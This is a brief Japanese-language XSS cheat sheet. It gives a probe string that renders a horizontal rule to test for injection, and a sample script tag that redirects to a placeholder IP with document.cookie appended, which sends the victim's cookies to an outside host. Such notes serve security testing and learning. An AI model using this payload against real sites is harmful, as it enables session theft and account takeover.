# XSS

## 検証方法

`'>"><hr>`を使用して水平線を表示

## サンプル

* `<script>document.location="http://[ip address]/" + document.cookie</script>`でクッキーを外部に送信
